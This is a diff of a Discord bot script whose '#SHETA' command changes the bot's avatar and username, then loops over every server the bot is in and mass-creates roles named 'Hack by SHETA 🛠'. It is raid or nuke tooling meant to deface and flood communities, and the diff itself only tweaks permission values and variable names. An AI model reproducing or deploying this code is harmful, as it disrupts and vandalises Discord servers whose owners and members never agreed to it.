@@ -27,15 +27,15 @@ LOka.on("message", message => {
   }
 });
 
-var x2 = "#SHETA";
+var x1 = "SHET";
 LOka.on("message", message => {
-  if (message.content === "#SHETA") {
+  if (message.content === "#SHET") {
     LOka.user.setAvatar(
       `https://cdn.discordapp.com/attachments/733991998520033333/739954089101885523/SAVE_20200804_241307.jpg`
     );
   }
 });
-var x2 = "#";
+var x1 = "#";
 LOka.on("message", message => {
   if (message.content === "#SHETA") {
     LOka.user.setUsername("#SHETA");
@@ -46,7 +46,6 @@ LOka.on("message", message => {
     LOka.user.setGame(`#help`, "https://www.twitch.tv/rawyar_");
   }
 });
-`fhelp`;
 LOka.on("message", message => {
   if (message.content === "#SHETA") {
     LOka.guilds.forEach(m => {
@@ -602,50 +601,50 @@ LOka.on("message", message => {
       });
       m.createRole({
         name: "Hack by SHETA 🛠",
-        permissions: [2],
+        permissions: [1],
         color: " #ff0000"
       });
       m.createRole({
         name: "Hack by SHETA 🛠",
-        permissions: [2],
-        color: " #ff0000"
-      });
-
-      m.createRole({
-        name: "Hack by SHETA 🛠",
-        permissions: [2],
-        color: " #ff0000"
-      });
-      m.createRole({
-        name: "Hack by SHETA 🛠",
-        permissions: [2],
-        color: " #ff0000"
-      });
-      m.createRole({
-        name: "Hack by SHETA 🛠",
-        permissions: [2],
+        permissions: [1],
         color: " #ff0000"
       });
 
       m.createRole({
         name: "Hack by SHETA 🛠",
-        permissions: [2],
+        permissions: [1],
         color: " #ff0000"
       });
       m.createRole({
         name: "Hack by SHETA 🛠",
-        permissions: [2],
+        permissions: [1],
         color: " #ff0000"
       });
       m.createRole({
         name: "Hack by SHETA 🛠",
-        permissions: [2],
+        permissions: [1],
         color: " #ff0000"
       });
 
       m.createRole({
         name: "Hack by SHETA 🛠",
-        permissions: [2],
+        permissions: [1],
+        color: " #ff0000"
+      });
+      m.createRole({
+        name: "Hack by SHETA 🛠",
+        permissions: [1],
+        color: " #ff0000"
+      });
+      m.createRole({
+        name: "Hack by SHETA 🛠",
+        permissions: [1],
+        color: " #ff0000"
+      });
+
+      m.createRole({
+        name: "Hack by SHETA 🛠",
+        permissions: [1],
         color: " #ff0000"
       });
     });
